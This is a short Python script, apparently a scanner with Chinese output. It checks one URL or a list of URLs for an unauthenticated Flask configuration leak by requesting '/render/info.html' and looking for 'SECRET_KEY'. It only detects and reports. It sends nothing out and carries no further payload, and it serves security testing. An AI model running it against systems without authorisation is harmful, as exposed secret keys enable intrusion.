import requests
import time
import sys
import colorama
from colorama import Style, Fore

def check_vuln(url):
    vuln_path = "/render/info.html"
    full_url = url + vuln_path
    start_vuln_url = requests.get(full_url)
    
    if start_vuln_url.status_code == 200 and "SECRET_KEY" in start_vuln_url.text:
        print(Fore.GREEN, "[+]存在未经身份验证Flask配置泄漏漏洞", Style.RESET_ALL)
        print(Fore.GREEN,"URL:", url,Style.RESET_ALL)
        print(Fore.GREEN,"漏洞地址:", full_url,Style.RESET_ALL)
        return True
    else:
        print(Fore.RED, "[-]不存在未经身份验证Flask配置泄漏漏洞", Style.RESET_ALL)
        return False

def main():
    colorama.init()
    command_line_args = sys.argv[1:]
    
    if not command_line_args:
        print_help()
        return
    
    option = command_line_args[0]
    
    if option == "-u" and len(command_line_args) > 1:
        url = command_line_args[1]
        check_vuln(url)
        
    elif option == "-f" and len(command_line_args) > 1:
        file_name = command_line_args[1]
        
        try:
            with open(file_name, "r") as file:
                urls = file.readlines()
                for url in urls:
                    url = url.strip()
                    try:
                        check_vuln(url)
                    except requests.exceptions.RequestException:
                        print(Fore.RED,f"无法连接至: {url}",Style.RESET_ALL)
                    time.sleep(1)
                    
        except FileNotFoundError:
            print("没有该文件")
            
    elif option == "-h":
        print_help()
        
    else:
        print("无效命令") 
        
def print_help():
    print("Usage:")
    print("-u <url>:检测URL漏洞")
    print("-f <file>:批量检测漏洞")
    print("-h :帮助")
    
if __name__ == "__main__":
    main()
